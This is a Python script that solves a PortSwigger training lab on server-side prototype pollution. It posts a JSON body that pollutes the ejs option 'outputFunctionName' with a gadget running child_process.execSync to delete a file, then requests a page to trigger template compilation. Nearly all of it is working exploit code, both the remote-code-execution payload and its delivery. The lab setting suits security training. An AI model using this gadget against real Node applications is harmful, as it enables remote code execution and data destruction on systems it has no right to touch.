"""
Lab 10: Remote code execution via server-side prototype pollution
https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution
Difficulty: Expert

📝 Chain pollution into RCE — the capstone of the module. This needs a
documented gadget specific to whatever templating/child-process-adjacent
library the app uses server-side; a well-known public chain for this exact
lab pollutes options an `ejs`-style template renderer reads unsafely
(commonly something like an `outputFunctionName` or `escape` option that,
once attacker-controlled, lets arbitrary JS run during template
compilation). Treat this as a documented-technique lab, same spirit as the
Insecure Deserialization module's tool-assisted labs — not something to
derive from first principles here.
"""

import json

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
UPDATE_PROFILE_PATH = "/my-account/update"
WIENER = {"username": "wiener", "password": "peter"}

# Representative shape of the documented ejs-based RCE gadget — pollutes an
# option that influences how the template engine COMPILES (not just
# renders) a template, letting attacker-controlled JS run server-side.
# Confirm the exact option name against a current PortSwigger writeup
# before relying on it, since this is tied to the specific ejs version
# bundled with the lab.
RCE_GADGET_BODY = {
    "name": "wiener",
    "email": "x@x.com",
    "__proto__": {
        "outputFunctionName": (
            "x;process.mainModule.require('child_process')"
            ".execSync('rm /home/carlos/morale.txt');x"
        )
    },
}


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    note("Step 1: send the pollution request carrying the gadget property.")
    r = s.post(f"{TARGET}{UPDATE_PROFILE_PATH}", data=json.dumps(RCE_GADGET_BODY),
               headers={"Content-Type": "application/json"})
    log(f"Pollution request status: {r.status_code}")

    note("Step 2: trigger whatever page ACTUALLY renders a template after")
    note("this — profile update confirmation pages are the typical trigger")
    note("for ejs-based chains, since that's what causes a (re-)compile.")
    r = s.get(f"{TARGET}/")
    log(f"Trigger status: {r.status_code}")

    note("This specific gadget (outputFunctionName) is the PUBLICLY")
    note("documented one for this lab as of recent writeups, but ejs")
    note("internals have shifted across versions before — if this doesn't")
    note("land, search 'PortSwigger RCE server-side prototype pollution")
    note("ejs' for the current confirmed property name and reuse the same")
    note("delivery shape above with it swapped in.")


if __name__ == "__main__":
    run()
